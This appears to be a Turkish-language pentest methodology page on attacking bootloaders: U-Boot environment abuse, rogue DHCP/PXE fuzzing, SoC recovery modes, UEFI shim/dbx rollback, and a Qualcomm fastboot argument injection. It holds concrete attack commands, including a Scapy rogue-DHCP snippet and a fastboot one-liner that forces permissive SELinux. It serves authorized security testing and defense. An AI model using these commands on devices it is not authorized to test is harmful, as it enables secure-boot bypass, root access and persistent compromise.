# Bootloader Testi

{{#include ../../banners/hacktricks-training.md}}

U-Boot ve UEFI sınıfı yükleyiciler gibi bootloader'ları test etmek ve cihaz başlangıç yapılandırmalarını değiştirmek için aşağıdaki adımlar önerilir. Erken aşamada kod yürütme elde etmeye, imza/rollback korumalarını değerlendirmeye ve kurtarma ya da ağdan boot etme yollarını kötüye kullanmaya odaklanın.

İlgili: bl2_ext patching aracılığıyla MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot için hızlı kazanımlar ve ortamı kötüye kullanma

1. Yorumlayıcı shell'ine erişin
   - Boot sırasında, `bootcmd` çalışmadan önce U-Boot istemine düşmek için bilinen bir durdurma tuşuna (genellikle herhangi bir tuş, 0, boşluk veya karta özgü bir "magic" dizisi) basın.<sup>[[1]](#references)</sup>

2. Boot durumunu ve değişkenleri inceleyin
   - Yararlı komutlar:
     - `printenv` (ortamı döker)
     - `bdinfo` (kart bilgileri, bellek adresleri)
     - `help bootm; help booti; help bootz` (desteklenen kernel boot yöntemleri)
     - `help ext4load; help fatload; help tftpboot` (kullanılabilir yükleyiciler)

3. Root shell elde etmek için boot argümanlarını değiştirin
   - Kernel'in normal init yerine shell'e düşmesi için `init=/bin/sh` ekleyin:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. TFTP server'ınızdan Netboot edin
   - Ağı yapılandırın ve LAN'den bir kernel/fit image alın:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Değişiklikleri env üzerinden kalıcı hale getirin
   - env storage yazma korumalı değilse, kontrolü kalıcı hale getirebilirsiniz:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Fallback yollarını etkileyen `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` gibi değişkenleri kontrol edin. Yanlış yapılandırılmış değerler, shell'e tekrar tekrar düşülmesine yol açabilir.

6. Debug/güvensiz özellikleri kontrol edin
   - Şunları arayın: `bootdelay` > 0, `autoboot` devre dışı, kısıtlamasız `usb start; fatload usb 0:1 ...`, seri bağlantı üzerinden `loady`/`loads` kullanabilme, güvenilmeyen medyadan `env import` ve imza kontrolleri olmadan yüklenen kernel/ramdisk'ler.

7. U-Boot image/doğrulama testi
   - Platform FIT image'larıyla secure/verified boot sağladığını iddia ediyorsa hem imzasız hem de kurcalanmış image'ları deneyin:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` bulunmaması veya eski `verify=n` davranışı genellikle keyfi payload'ların boot edilmesine izin verir.
   - Basit bir izin/ret sonucuyla yetinmeyin: Yakın tarihli FIT araştırmaları, doğrulama yolunun kendisinin pre-auth saldırı yüzeyi olabileceğini gösterdi. Harici olarak depolanan FIT verilerini (`data-offset`, `data-position`, `data-size`), imzalı yapılandırma seçimini, `loadables`'ı ve overlay / `extra-conf` işleme süreçlerini negatif test edin.
   - Eşleşen bir kaynak ağacınız varsa, gerçek donanıma dokunmadan önce U-Boot sandbox'ta FIT doğrulama davranışını yeniden üretmek için `test/vboot/vboot_test.sh` hızlı bir yöntemdir.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` ve script bootflows
   - Modern U-Boot derlemelerinde `bootcmd` çoğu zaman Standard Boot etrafında bir wrapper'dan ibarettir. Bu, görünür ortam zararsız görünse bile yazılabilir medyanın, PXE'nin veya SPI flash'ın gerçek güven sınırı olabileceği anlamına gelir.
   - `extlinux` bootmeth, `/` ve `/boot` altında `extlinux/extlinux.conf` dosyasını arar; script bootmeth ise önce `boot.scr.uimg`, ardından `boot.scr` dosyasını arar. Network boot sırasında script dosya adı `boot_script_dhcp` üzerinden gelebilir.
   - Yararlı triage komutları:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Test edilecek abuse senaryoları: `boot_targets` içinde daha üst sırada bulunan saldırgan denetimindeki USB/SD medyası, yazılabilir `/boot/extlinux/extlinux.conf`, `boot.scr` sağlayan rogue TFTP veya `script_offset_f` üzerinden SPI destekli script yürütme.
   - Platform FIT verification kullanıyorsa yapılandırmaların yalnızca her image için değil, yapılandırma düzeyinde de imzalandığından emin olun; `required-mode=all`, gerekli anahtarlardan herhangi birini kabul etmekten daha güçlüdür.

## Network-boot yüzeyi (DHCP/PXE) ve rogue sunucular

9. PXE/DHCP parametre fuzzing’i
   - U-Boot’un eski BOOTP/DHCP işleme kodunda bellek güvenliği sorunları görüldü. Örneğin CVE‑2024‑42040, U-Boot belleğindeki baytları kablo üzerinden geri sızdırabilen, özel hazırlanmış DHCP yanıtları aracılığıyla bellek ifşasını açıklar.<sup>[[4]](#references)</sup> DHCP/PXE kod yollarını aşırı uzun veya uç durum değerleriyle (67 numaralı seçenek olan bootfile-name, vendor seçenekleri, file/servername alanları) test edin ve takılma/leak olup olmadığını gözlemleyin.
   - Netboot sırasında boot parametrelerini zorlamak için minimal Scapy snippet’i:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - PXE filename alanlarının, OS tarafındaki provisioning script’lerine zincirlendiğinde sanitization uygulanmadan shell/loader logic’e aktarılıp aktarılmadığını da doğrulayın.

10. Rogue DHCP server command injection testi
   - Rogue bir DHCP/PXE service kurun ve boot chain’in sonraki aşamalarında command interpreter’lara ulaşmak için filename veya options alanlarına karakter enjekte etmeyi deneyin. Metasploit’in DHCP auxiliary modülü, `dnsmasq` veya özel Scapy script’leri işinizi görür. Önce lab ağını izole ettiğinizden emin olun.

## Normal boot sürecini geçersiz kılan SoC ROM recovery modları

Birçok SoC, flash image’leri geçersiz olsa bile USB/UART üzerinden kod kabul eden bir BootROM "loader" modu sunar. Secure-boot fuse’ları yakılmamışsa bu, chain’in çok erken bir aşamasında arbitrary code execution sağlayabilir.

- NXP i.MX (Serial Download Mode)
  - Araçlar: `uuu` (mfgtools3) veya `imx-usb-loader`.
  - Örnek: RAM’den özel bir U-Boot yükleyip çalıştırmak için `imx-usb-loader u-boot.imx`.
- Allwinner (FEL)
  - Araç: `sunxi-fel`.
  - Örnek: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` veya `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Araç: `rkdeveloptool`.
  - Örnek: Bir loader hazırlayıp özel U-Boot yüklemek için `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`.

Cihazın secure-boot eFuses/OTP’lerinin yakılıp yakılmadığını değerlendirin. Yakılmamışlarsa BootROM download modları, ilk aşama payload’ınızı doğrudan SRAM/DRAM’den çalıştırarak çoğu zaman daha üst düzeydeki doğrulamaları (U-Boot, kernel, rootfs) atlatır.

## UEFI/PC sınıfı bootloader’lar: hızlı kontroller

11. ESP tampering, rollback ve key enrollment testi
   - EFI System Partition’ı (ESP) mount edin ve loader bileşenlerini kontrol edin: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo yolları.
   - Mümkünse OS üzerinden Secure Boot durumunu ve key database’lerini dökümleyin:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Platform Setup Mode'daysa, kimlik doğrulaması olmadan anahtar kaydını kabul ediyorsa veya test/varsayılan bir Platform Key ile (PKfail sınıfı) geliyorsa, yerel bir admin ya da fiziksel erişimi olan bir saldırgan kendi KEK/db anahtarlarını kaydedebilir ve rastgele EFI binary'lerini başlatırken Secure Boot “etkin” görünümünü koruyabilir.<sup>[[3]](#references)</sup>
   - Secure Boot iptal listeleri (dbx) güncel değilse, sürümü düşürülmüş veya bilinen şekilde güvenlik açığı bulunan imzalı boot bileşenleriyle başlatmayı deneyin. Platform eski shim/bootmanager'lara hâlâ güveniyorsa, kalıcılık elde etmek için çoğu zaman ESP'den kendi kernel'inizi veya `grub.cfg` dosyanızı yükleyebilirsiniz.
   - Windows'ta, firmware `dbx` içinde `Microsoft Windows Production PCA 2011` imzalayıcısı yoksa yamalanmış makineler bile güvenlik açığı bulunan imzalı boot manager'ları kabul edebilir; BlackX'te de bu gözlemlenmiştir.<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop tarzı bir bypass, saldırganın kendi MOK'unu kaydetmesini sağlayabilir; ardından meşru bir shim, sonraki boot işlemlerinde bu anahtarla imzalanmış bir EFI payload'ı yükleyebilir.<sup>[[12]](#references)[[13]](#references)</sup> Eski Windows imzalayıcısının daha sonra iptal edilmesi, kaydedilmiş MOK'u kaldırmaz; bu nedenle shim'e güvenilmeye devam edilirse shim tabanlı yol kalıcı olabilir.<sup>[[12]](#references)</sup>
   - Yetkili bir UEFI makinesinde bu rollback yolunu test etmeden önce yalnızca Windows güncelleme geçmişini değil, **firmware'deki etkin iptal durumunu** kontrol edin.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft, `dbx` içindeki 2011 imzalayıcısı için yükseltilmiş yetkilerle çalıştırılabilecek salt okunur PowerShell kontrolünü şöyle sunuyor:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` yalnızca bir ipucudur: kurtarılabilir bir lab ortamında belirli imzalı boot bileşenini ve diğer iptal kayıtlarını doğrulayın.<sup>[[12]](#references)[[14]](#references)</sup> Bekleyen bir registry güncellemesi veya süresi dolmuş bir imza sertifikası, tamamlanmış bir `dbx` iptaliyle eşdeğer değildir.<sup>[[13]](#references)[[14]](#references)</sup>

12. Eski shim / SBAT / dbx iptal testi
   - Eski Microsoft imzalı shim'ler ve vendor fork'ları, iptal kayıtları güncel değilse hâlâ BYOVD tarzı bir bootkit yolu işlevi görebilir. İzole bir lab ortamında, geçmişte güvenlik açığı bulunan bir shim'i ESP'ye yerleştirin ve kendi `grubx64.efi` dosyanızı veya kernel'inizi chainload etmeyi deneyin.<sup>[[11]](#references)</sup>
   - Hızlı ön değerlendirme:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Shim, iptal listesinde olmasına rağmen hâlâ çalışıyorsa firmware/OS'te eski `dbx` güncellemeleri vardır veya upstream SBAT korumalarını hiç devralmamış fork edilmiş bir loader'a güveniliyordur.

13. Boot logo ayrıştırma hataları (LogoFAIL sınıfı)
   - Birkaç OEM/IBV firmware'i, boot logolarını işleyen DXE'deki görüntü ayrıştırma açıklarından etkileniyordu. Saldırgan ESP'ye, üreticiye özgü bir yola (ör. `\EFI\<vendor>\logo\*.bmp`) hazırlanmış bir görüntü yerleştirip sistemi yeniden başlatabiliyorsa, Secure Boot etkin olsa bile erken boot sırasında kod çalıştırmak mümkün olabilir. Platformun kullanıcı tarafından sağlanan logoları kabul edip etmediğini ve bu yollara OS'ten yazılıp yazılamadığını test edin.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) güven boşlukları

Qualcomm'un ABL'ini kullanarak **Generic Bootloader Library (GBL)** yükleyen Android 16 cihazlarında, ABL'in `efisp` bölümünden yüklediği UEFI uygulamasını **doğrulayıp doğrulamadığını** kontrol edin. ABL yalnızca UEFI uygulamasının **varlığını** kontrol ediyor ve imzaları doğrulamıyorsa, `efisp`'e yazma primi boot sırasında **pre-OS imzasız kod çalıştırmaya** dönüşür.<sup>[[6]](#references)[[7]](#references)</sup>

Uygulanabilir kontroller ve istismar yolları:

- **efisp yazma primi**: `efisp` içine özel bir UEFI uygulaması yazmanın bir yoluna ihtiyacınız var (root/ayrıcalıklı servis, OEM uygulama hatası, recovery/fastboot yolu). Bu olmadan GBL yükleme boşluğuna doğrudan erişilemez.<sup>[[6]](#references)</sup>
- **fastboot OEM argüman enjeksiyonu** (ABL hatası): Bazı build'ler `fastboot oem set-gpu-preemption` komutundaki ek token'ları kabul edip kernel cmdline'a ekler. Bu, permissive SELinux'u zorlamak ve korumalı bölümlere yazmayı mümkün kılmak için kullanılabilir:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Cihaz yamalıysa komut, fazladan argümanları reddetmelidir.<sup>[[5]](#references)[[6]](#references)</sup>
- **Kalıcı flag'ler aracılığıyla bootloader kilidini açma**: Boot aşamasındaki bir payload, OEM sunucusu/onay engellerini aşarak `fastboot oem unlock` komutunu taklit etmek için kalıcı kilit açma flag'lerini (ör. `is_unlocked=1`, `is_unlocked_critical=1`) değiştirebilir. Bu, sonraki yeniden başlatmadan sonra da süren bir durum değişikliğidir.<sup>[[6]](#references)</sup>

Savunma/triage notları:

- ABL'nin `efisp` üzerinden gelen GBL/UEFI payload'ı için imza doğrulaması yapıp yapmadığını doğrulayın. Yapmıyorsa `efisp`'i yüksek riskli bir persistence yüzeyi olarak değerlendirin.
- ABL fastboot OEM handler'larının **argüman sayılarını doğrulayacak** ve ek token'ları reddedecek şekilde yamalanıp yamalanmadığını takip edin.<sup>[[8]](#references)[[9]](#references)</sup>

## Donanım uyarısı

Erken boot sırasında SPI/NAND flash ile etkileşim kurarken (ör. okumaları atlamak için pinleri toprağa bağlamak) dikkatli olun ve daima flash veri sayfasına başvurun. Yanlış zamanlanmış kısa devreler cihaza veya programlayıcıya zarar verebilir.

## Notlar ve ek ipuçları

- Ortam blob'larını RAM ile depolama arasında taşımak için `env export -t ${loadaddr}` ve `env import -t ${loadaddr}` komutlarını deneyin; bazı platformlar çıkarılabilir medyadan kimlik doğrulaması olmadan env içe aktarmaya izin verir.
- `extlinux.conf` üzerinden boot eden Linux tabanlı sistemlerde, imza kontrolleri uygulanmıyorsa boot bölümündeki `APPEND` satırını değiştirmek (`init=/bin/sh` veya `rd.break` eklemek için) genellikle yeterlidir.
- Hedef dual-slot / A/B güncellemeleri kullanıyorsa, bootloader dışındaki updater'a özgü güven boşluklarını gözden kaçırmamak için [firmware analysis overview](README.md) içindeki anti-rollback ve slot-desync tekniklerini inceleyin.
- Userland `fw_printenv/fw_setenv` sağlıyorsa, `/etc/fw_env.config` dosyasının gerçek env depolama alanıyla eşleştiğini doğrulayın. Yanlış yapılandırılmış offset'ler yanlış MTD bölgesini okumanıza/yazmanıza neden olabilir.

## References

- [1] [Firmware Güvenlik Testi Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL'i bulmak: Sistem boot edilirken görüntü ayrıştırmanın tehlikeleri](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Güvenilmeyen Platform Anahtarları, UEFI ekosisteminde Secure Boot'u zayıflatıyor](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 ayrıntısı](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Önceden engellendi: İki temizlenmemiş string ile Xiaomi kilidini açma](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit'i saldırganların bootloader kilitlerini açmasını sağlıyor](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) mimarisi](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Güvenilmeyen girdinin kernel cmdline'a aktarımını düzeltme](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value komutu için kontrol ekleme](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Boot edilemez: U-Boot'un FIT imza doğrulamasını bozma](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Güvenlik Açığı Notu VU#616257 - Microsoft imzalı UEFI shim bootloader'ları Secure Boot atlatmasına karşı savunmasız](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit: İddia doğrulandı](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: BlackLotus benzeri bir UEFI bootkit'i](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Secure Boot değişiklikleri için Windows Boot Manager iptallerini yönetme](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
